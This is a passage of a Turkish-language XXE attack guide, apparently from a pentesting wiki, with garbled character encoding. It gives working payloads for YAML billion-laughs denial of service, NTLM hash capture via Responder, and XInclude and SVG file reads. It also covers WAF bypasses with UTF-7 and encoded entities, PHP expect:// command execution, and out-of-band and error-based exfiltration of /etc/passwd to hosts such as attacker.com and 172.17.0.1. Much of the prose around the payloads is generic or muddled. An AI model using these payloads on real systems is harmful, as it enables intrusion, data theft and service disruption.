Yaml saldÄ±rÄ±sÄ±, YAML (YAML Ain't Markup Language) dosyalarÄ±nÄ±n iÅŸlenmesi sÄ±rasÄ±nda ortaya Ã§Ä±kan bir gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r. Bu saldÄ±rÄ±, XML External Entity (XXE) saldÄ±rÄ±sÄ±na benzer bir ÅŸekilde Ã§alÄ±ÅŸÄ±r. YAML, yapÄ±landÄ±rma dosyalarÄ±nÄ± temsil etmek iÃ§in kullanÄ±lan bir veri serileÅŸtirme formatÄ±dÄ±r.

Yaml saldÄ±rÄ±sÄ±, YAML dosyasÄ±nÄ±n iÃ§ine yerleÅŸtirilen kÃ¶tÃ¼ niyetli bir dÄ±ÅŸ etki (external entity) kullanarak gerÃ§ekleÅŸtirilir. Bu dÄ±ÅŸ etki, YAML iÅŸlemleyicisi tarafÄ±ndan iÅŸlenirken, sistemdeki hassas bilgilere eriÅŸim saÄŸlayabilir veya istismar edilebilir.

Yaml saldÄ±rÄ±sÄ±, bir hedefin YAML dosyasÄ±nÄ± iÅŸlerken, dÄ±ÅŸ etkilerin yÃ¼ksek ayrÄ±calÄ±klara sahip bir sunucuya eriÅŸmesine izin verebilir. Bu, saldÄ±rganÄ±n hedef sistemi ele geÃ§irmesine ve yetkisiz iÅŸlemler gerÃ§ekleÅŸtirmesine olanak tanÄ±r.

Yaml saldÄ±rÄ±larÄ±ndan korunmak iÃ§in, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± en aza indirmek iÃ§in gÃ¼venilir bir YAML iÅŸlemleyici kullanÄ±lmalÄ±dÄ±r. AyrÄ±ca, kullanÄ±cÄ± giriÅŸlerinin doÄŸrulanmasÄ± ve gÃ¼venli bir ÅŸekilde iÅŸlenmesi Ã¶nemlidir.
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Karesel Patlama SaldÄ±rÄ±sÄ±

![](<../.gitbook/assets/image (531).png>)

#### NTML Elde Etme

Windows ana bilgisayarlarÄ±nda, bir responder.py iÅŸleyici ayarlayarak web sunucusu kullanÄ±cÄ±sÄ±nÄ±n NTML karmaÅŸasÄ±nÄ± elde etmek mÃ¼mkÃ¼ndÃ¼r:
```bash
Responder.py -I eth0 -v
```
ve aÅŸaÄŸÄ±daki isteÄŸi gÃ¶ndererek
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
ArdÄ±ndan hashcat kullanarak hash'i kÄ±rmayÄ± deneyebilirsiniz.

## Gizli XXE YÃ¼zeyleri

### XInclude

MÃ¼ÅŸteri verilerini sunucu tarafÄ±nda XML belgelerine entegre ederken, Ã¶zellikle arka uÃ§ SOAP isteklerinde, XML yapÄ±sÄ± Ã¼zerinde doÄŸrudan kontrol genellikle sÄ±nÄ±rlÄ±dÄ±r ve `DOCTYPE` Ã¶ÄŸesini deÄŸiÅŸtirmek kÄ±sÄ±tlanÄ±r, bu da geleneksel XXE saldÄ±rÄ±larÄ±nÄ± engeller. Bununla birlikte, `XInclude` saldÄ±rÄ±sÄ±, XML belgesinin herhangi bir veri Ã¶ÄŸesine harici varlÄ±klarÄ±n eklenmesine izin vererek bir Ã§Ã¶zÃ¼m sunar. Bu yÃ¶ntem, yalnÄ±zca sunucu tarafÄ±nda oluÅŸturulan XML belgesinin bir kÄ±smÄ± kontrol edilebildiÄŸinde bile etkilidir.

Bir `XInclude` saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in, `XInclude` ad alanÄ±nÄ±n bildirilmesi ve hedeflenen harici varlÄ±k iÃ§in dosya yolu belirtilmesi gerekmektedir. AÅŸaÄŸÄ±da, bÃ¶yle bir saldÄ±rÄ±nÄ±n nasÄ±l formÃ¼le edilebileceÄŸine dair Ã¶zlÃ¼ bir Ã¶rnek bulunmaktadÄ±r:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Daha fazla bilgi iÃ§in [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) adresini kontrol edin!

### SVG - Dosya YÃ¼kleme

KullanÄ±cÄ±lar tarafÄ±ndan belirli uygulamalara yÃ¼klenen ve ardÄ±ndan sunucuda iÅŸlenen dosyalar, XML veya XML iÃ§eren dosya biÃ§imlerinin nasÄ±l iÅŸlendiÄŸi konusunda gÃ¼venlik aÃ§Ä±klarÄ±nÄ± sÃ¶mÃ¼rebilir. Ofis belgeleri (DOCX) ve resimler (SVG) gibi yaygÄ±n dosya biÃ§imleri XML'e dayanmaktadÄ±r.

KullanÄ±cÄ±lar **resim yÃ¼klediÄŸinde**, bu resimler sunucu tarafÄ±nda iÅŸlenir veya doÄŸrulanÄ±r. PNG veya JPEG gibi formatlarÄ± bekleyen uygulamalar iÃ§in bile, **sunucunun resim iÅŸleme kÃ¼tÃ¼phanesi SVG resimlerini de destekleyebilir**. XML tabanlÄ± bir biÃ§im olan SVG, saldÄ±rganlarÄ±n kÃ¶tÃ¼ niyetli SVG resimleri gÃ¶ndererek sunucuyu XXE (XML DÄ±ÅŸ Kaynak) gÃ¼venlik aÃ§Ä±klarÄ±na maruz bÄ±rakmasÄ±na olanak tanÄ±r.

AÅŸaÄŸÄ±da bÃ¶yle bir saldÄ±rÄ±nÄ±n bir Ã¶rneÄŸi gÃ¶sterilmektedir, kÃ¶tÃ¼ niyetli bir SVG resmi sistem dosyalarÄ±nÄ± okumaya Ã§alÄ±ÅŸÄ±r:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
BaÅŸka bir yÃ¶ntem, PHP "expect" sarmalayÄ±cÄ±sÄ± aracÄ±lÄ±ÄŸÄ±yla komutlarÄ± **Ã§alÄ±ÅŸtÄ±rmaya** Ã§alÄ±ÅŸmaktÄ±r:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
Her iki durumda da, sunucunun yazÄ±lÄ±mÄ±nÄ±n XML iÅŸleme yeteneklerini istismar eden saldÄ±rÄ±larÄ± baÅŸlatmak iÃ§in SVG formatÄ± kullanÄ±lÄ±r, bu da saÄŸlam giriÅŸ doÄŸrulama ve gÃ¼venlik Ã¶nlemlerine olan ihtiyacÄ± vurgular.

Daha fazla bilgi iÃ§in [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) adresini kontrol edin!

**Not: Dosya okuma veya yÃ¼rÃ¼tme sonucunun ilk satÄ±rÄ± OLUÅTURULAN resmin Ä°Ã‡Ä°NDE gÃ¶rÃ¼necektir. Bu nedenle, SVG'nin oluÅŸturduÄŸu resme eriÅŸebilmeniz gerekmektedir.**

### **PDF - Dosya yÃ¼kleme**

Bir XXE'yi sÃ¶mÃ¼rmek iÃ§in bir PDF dosyasÄ± yÃ¼klemeyi nasÄ±l gerÃ§ekleÅŸtireceÄŸinizi Ã¶ÄŸrenmek iÃ§in aÅŸaÄŸÄ±daki gÃ¶nderiyi okuyun:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: x-www-urlencoded'den XML'e

Bir POST isteÄŸi verileri XML formatÄ±nda kabul ediyorsa, bu isteÄŸi bir XXE'yi sÃ¶mÃ¼rmek iÃ§in kullanabilirsiniz. Ã–rneÄŸin, normal bir istek aÅŸaÄŸÄ±dakileri iÃ§eriyorsa:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Sonra aÅŸaÄŸÄ±daki isteÄŸi gÃ¶nderebilirsiniz, aynÄ± sonuÃ§la:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: JSON'dan XEE'ye

Ä°steÄŸi deÄŸiÅŸtirmek iÃ§in "Content Type Converter" adlÄ± bir Burp Eklentisini kullanabilirsiniz. Bu Ã¶rneÄŸi [burada](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) bulabilirsiniz:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
BaÅŸka bir Ã¶rnek [burada](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2) bulunabilir.

## WAF ve Koruma GeÃ§iÅŸleri

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Bu, XML sunucusunun `data://` protokolÃ¼nÃ¼ kabul ettiÄŸi durumlarda Ã§alÄ±ÅŸÄ±r.

### UTF-7

Burada \[**"Encode Recipe**" of cyberchef here ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) UTF-7'ye dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in \[**"Encode Recipe**" of cyberchef here ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to) kullanabilirsiniz.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Dosya:/ ProtokolÃ¼ Bypass

EÄŸer web PHP kullanÄ±yorsa, `file:/` yerine **php wrappers**`php://filter/convert.base64-encode/resource=` kullanarak **iÃ§ dosyalara eriÅŸebilirsiniz**.

EÄŸer web Java kullanÄ±yorsa [**jar: protokolÃ¼nÃ¼**](xxe-xee-xml-external-entity.md#jar-protocol) kontrol edebilirsiniz.

### HTML Entiteleri

[**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes) adresinden alÄ±nan bir hile\
**HTML entiteleri** kullanarak bir **entiteyi iÃ§inde bir entite oluÅŸturabilir** ve ardÄ±ndan bir dtd yÃ¼klemek iÃ§in onu Ã§aÄŸÄ±rabilirsiniz.\
KullanÄ±lan **HTML Entiteleri**nin **sayÄ±sal** olmasÄ± gerektiÄŸini unutmayÄ±n (Ã¶rnekteki gibi \[bu Ã¶rnekte]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD Ã¶rneÄŸi:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

Bu Ã¶rnekte, `DOCTYPE` tanÄ±mÄ±nda `foo` adÄ±nda bir Ã¶ÄŸe ve `xxe` adÄ±nda bir varlÄ±k tanÄ±mlanmÄ±ÅŸtÄ±r. `xxe` varlÄ±ÄŸÄ±, `/etc/passwd` dosyasÄ±nÄ± okumak iÃ§in kullanÄ±lÄ±r. `foo` Ã¶ÄŸesinde `&xxe;` varlÄ±ÄŸÄ± Ã§aÄŸrÄ±larak `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸi alÄ±nÄ±r.
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP SargÄ±layÄ±cÄ±larÄ±

### Base64

**index.php** _dosyasÄ±nÄ± Ã§Ä±karÄ±n_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Harici kaynak Ã§Ä±karma**

XXE saldÄ±rÄ±larÄ±, XML dÄ±ÅŸ varlÄ±k (External Entity) iÅŸleme zafiyetlerini hedef alÄ±r. Bu saldÄ±rÄ±lar, XML verilerini iÅŸleyen uygulamalarda gÃ¼venlik aÃ§Ä±klarÄ± kullanarak harici kaynaklarÄ± Ã§Ä±karmayÄ± amaÃ§lar.

Bu saldÄ±rÄ± tÃ¼rÃ¼, hedef uygulamanÄ±n XML verilerini iÅŸlerken dÄ±ÅŸ varlÄ±klarÄ± yÃ¼klemesine izin veren bir zafiyet olduÄŸunda gerÃ§ekleÅŸtirilebilir. SaldÄ±rgan, XML verilerine Ã¶zel bir dÄ±ÅŸ varlÄ±k tanÄ±mlayarak, hedef uygulamanÄ±n bu dÄ±ÅŸ varlÄ±ÄŸÄ± iÅŸlemesini saÄŸlar. Bu dÄ±ÅŸ varlÄ±k, saldÄ±rganÄ±n kontrol ettiÄŸi bir kaynaÄŸa iÅŸaret edebilir, bÃ¶ylece saldÄ±rgan, hedef uygulamanÄ±n bu kaynaÄŸa eriÅŸmesini saÄŸlayabilir.

XXE saldÄ±rÄ±larÄ±, hassas verilerin Ã§alÄ±nmasÄ±, sistem kaynaklarÄ±nÄ±n ifÅŸa edilmesi veya hedef uygulamanÄ±n hizmet dÄ±ÅŸÄ± kalmasÄ± gibi ciddi sonuÃ§lara yol aÃ§abilir. Bu nedenle, uygulama geliÅŸtiricilerinin gÃ¼venli XML iÅŸleme tekniklerini kullanmalarÄ± Ã¶nemlidir.
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Uzaktan kod yÃ¼rÃ¼tme

**EÄŸer PHP "expect" modÃ¼lÃ¼ yÃ¼klenmiÅŸse**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

SOAP (Simple Object Access Protocol), XML tabanlÄ± bir iletiÅŸim protokolÃ¼dÃ¼r ve web servislerinde sÄ±klÄ±kla kullanÄ±lÄ±r. SOAP, XML mesajlarÄ±nÄ± kullanarak istemci ve sunucu arasÄ±nda veri alÄ±ÅŸveriÅŸi yapar. SOAP tabanlÄ± web servislerinde, XEE (XML External Entity) saldÄ±rÄ±larÄ± yaygÄ±n olarak kullanÄ±lan bir zayÄ±flÄ±ktÄ±r.

### XEE Nedir?

XML External Entity (XEE), XML tabanlÄ± uygulamalarda bulunan bir gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r. Bu saldÄ±rÄ± tÃ¼rÃ¼nde, saldÄ±rgan, XML dÃ¶kÃ¼manÄ±nda harici bir varlÄ±k (external entity) tanÄ±mlayarak, sunucunun hassas verilerini ifÅŸa etmesini saÄŸlar. XEE saldÄ±rÄ±larÄ±, SOAP tabanlÄ± web servislerinde Ã¶zellikle yaygÄ±n olarak kullanÄ±lÄ±r.

### XEE SaldÄ±rÄ±larÄ± NasÄ±l GerÃ§ekleÅŸtirilir?

XEE saldÄ±rÄ±larÄ±, XML dÃ¶kÃ¼manÄ±nda yer alan harici varlÄ±k tanÄ±mlamalarÄ± aracÄ±lÄ±ÄŸÄ±yla gerÃ§ekleÅŸtirilir. SaldÄ±rgan, XML dÃ¶kÃ¼manÄ±na Ã¶zel bir varlÄ±k tanÄ±mlayarak, sunucunun dosya sistemine eriÅŸim saÄŸlayabilir veya hassas verileri ifÅŸa edebilir.

XEE saldÄ±rÄ±larÄ± genellikle ÅŸu adÄ±mlarÄ± iÃ§erir:

1. XML dÃ¶kÃ¼manÄ±nda harici bir varlÄ±k tanÄ±mlama.
2. Harici varlÄ±k kullanarak sunucunun dosya sistemine eriÅŸim veya hassas verilerin ifÅŸa edilmesi.

### XEE SaldÄ±rÄ±larÄ±nÄ±n Etkileri

XEE saldÄ±rÄ±larÄ±, baÅŸarÄ±lÄ± bir ÅŸekilde gerÃ§ekleÅŸtirildiÄŸinde ciddi gÃ¼venlik sorunlarÄ±na yol aÃ§abilir. SaldÄ±rgan, sunucunun dosya sistemine eriÅŸim saÄŸlayarak, hassas verilere eriÅŸebilir veya sunucunun hizmetini engelleyebilir. Bu tÃ¼r saldÄ±rÄ±lar, kullanÄ±cÄ±larÄ±n gizli bilgilerinin ifÅŸa edilmesine veya yetkisiz eriÅŸime neden olabilir.

### XEE SaldÄ±rÄ±larÄ±na KarÅŸÄ± Korunma YÃ¶ntemleri

XEE saldÄ±rÄ±larÄ±na karÅŸÄ± korunmak iÃ§in aÅŸaÄŸÄ±daki Ã¶nlemler alÄ±nabilir:

1. GiriÅŸ doÄŸrulama ve veri doÄŸrulama iÅŸlemlerinin gÃ¼venli bir ÅŸekilde gerÃ§ekleÅŸtirilmesi.
2. XML dÃ¶kÃ¼manlarÄ±nÄ±n gÃ¼venli bir ÅŸekilde iÅŸlenmesi iÃ§in gÃ¼venilir XML iÅŸleme kÃ¼tÃ¼phanelerinin kullanÄ±lmasÄ±.
3. Harici varlÄ±k tanÄ±mlamalarÄ±nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±lmasÄ± veya sÄ±nÄ±rlanmasÄ±.
4. GÃ¼venlik duvarÄ± ve gÃ¼venlik politikalarÄ±nÄ±n doÄŸru ÅŸekilde yapÄ±landÄ±rÄ±lmasÄ±.

XEE saldÄ±rÄ±larÄ±na karÅŸÄ± korunmak iÃ§in gÃ¼venlik aÃ§Ä±klarÄ±nÄ±n dÃ¼zgÃ¼n bir ÅŸekilde tespit edilmesi ve dÃ¼zeltilmesi Ã¶nemlidir. Bu nedenle, dÃ¼zenli gÃ¼venlik testleri ve gÃ¼ncellemeler yapÄ±lmalÄ±dÄ±r.
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Bu Ã¶rnek, [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe) adresinden esinlenilmiÅŸtir.

XLIFF (XML Localization Interchange File Format), yerelleÅŸtirme sÃ¼reÃ§lerinde veri alÄ±ÅŸveriÅŸini standartlaÅŸtÄ±rmak iÃ§in kullanÄ±lÄ±r. Bu, yerelleÅŸtirme sÄ±rasÄ±nda araÃ§lar arasÄ±nda yerelleÅŸtirilebilir veri transferi iÃ§in kullanÄ±lan XML tabanlÄ± bir formattÄ±r ve CAT (Bilgisayar Destekli Ã‡eviri) araÃ§larÄ± iÃ§in ortak bir deÄŸiÅŸim formatÄ± olarak kullanÄ±lÄ±r.

### KÃ¶r Ä°stek Analizi

AÅŸaÄŸÄ±daki iÃ§erikle sunucuya bir istek yapÄ±lÄ±r:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Ancak, bu istek iÃ§eride bir sunucu hatasÄ± tetikler ve Ã¶zellikle iÅŸaretleme bildirimleriyle ilgili bir sorunu belirtir:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Hata olmasÄ±na raÄŸmen, Burp Collaborator'da bir vuruÅŸ kaydedilir ve bu da dÄ±ÅŸ varlÄ±kla bir ÅŸekilde etkileÅŸim olduÄŸunu gÃ¶sterir.

Veri DÄ±ÅŸarÄ± SÄ±zdÄ±rma Yoluyla BaÄŸlantÄ± DÄ±ÅŸÄ± Veri Ã‡alma
Veri Ã§almak iÃ§in deÄŸiÅŸtirilmiÅŸ bir istek gÃ¶nderilir:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Bu yaklaÅŸÄ±m, KullanÄ±cÄ± AracÄ±sÄ±nÄ±n Java 1.8 kullanÄ±mÄ±nÄ± gÃ¶sterdiÄŸini ortaya koyar. Bu Java sÃ¼rÃ¼mÃ¼nÃ¼n bir kÄ±sÄ±tlamasÄ±, /etc/passwd gibi yeni satÄ±r karakteri iÃ§eren dosyalarÄ±n Out of Band tekniÄŸi kullanÄ±larak alÄ±namamasÄ±dÄ±r.

Hata TabanlÄ± Veri SÄ±zdÄ±rma
Bu kÄ±sÄ±tlamayÄ± aÅŸmak iÃ§in Hata TabanlÄ± bir yaklaÅŸÄ±m kullanÄ±lÄ±r. DTD dosyasÄ±, bir hedef dosyadan veri iÃ§eren bir hatayÄ± tetiklemek iÃ§in aÅŸaÄŸÄ±daki gibi yapÄ±landÄ±rÄ±lÄ±r:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Sunucu bir hata ile yanÄ±t verir, Ã¶nemli olan mevcut olmayan dosyayÄ± yansÄ±tarak, sunucunun belirtilen dosyaya eriÅŸmeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± gÃ¶sterir:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Hata mesajÄ±nda dosyanÄ±n iÃ§eriÄŸini dahil etmek iÃ§in DTD dosyasÄ± ayarlanÄ±r:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Bu deÄŸiÅŸiklik, dosyanÄ±n iÃ§eriÄŸinin baÅŸarÄ±lÄ± bir ÅŸekilde dÄ±ÅŸarÄ± sÄ±zdÄ±rÄ±lmasÄ±na yol aÃ§ar, Ã§Ã¼nkÃ¼ HTTP aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderilen hata Ã§Ä±ktÄ±sÄ±nda yansÄ±tÄ±lÄ±r. Bu, hassas bilgileri Ã§Ä±karmak iÃ§in Hem Out of Band hem de Hata TabanlÄ± teknikleri kullanarak baÅŸarÄ±lÄ± bir XXE (XML External Entity) saldÄ±rÄ±sÄ±nÄ± gÃ¶sterir.


## RSS - XEE

XXE zafiyetini sÃ¶mÃ¼rmek iÃ§in geÃ§erli bir RSS formatÄ±nda XML.

### Ping back

SaldÄ±rganÄ±n sunucusuna basit bir HTTP isteÄŸi.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Dosya Okuma

Bir XXE saldÄ±rÄ±sÄ±yla hedef sistemin bir dosyayÄ± okumasÄ±nÄ± saÄŸlayabilirsiniz. Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in, hedef sisteme bir XML dÃ¶kÃ¼manÄ± gÃ¶ndermeniz gerekmektedir. XML dÃ¶kÃ¼manÄ±nda, hedefin okumasÄ±nÄ± istediÄŸiniz dosyanÄ±n yolunu belirtmelisiniz.

Ã–rneÄŸin, aÅŸaÄŸÄ±daki XML dÃ¶kÃ¼manÄ±nÄ± hedef sisteme gÃ¶ndererek `/etc/passwd` dosyasÄ±nÄ± okumasÄ±nÄ± saÄŸlayabilirsiniz:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

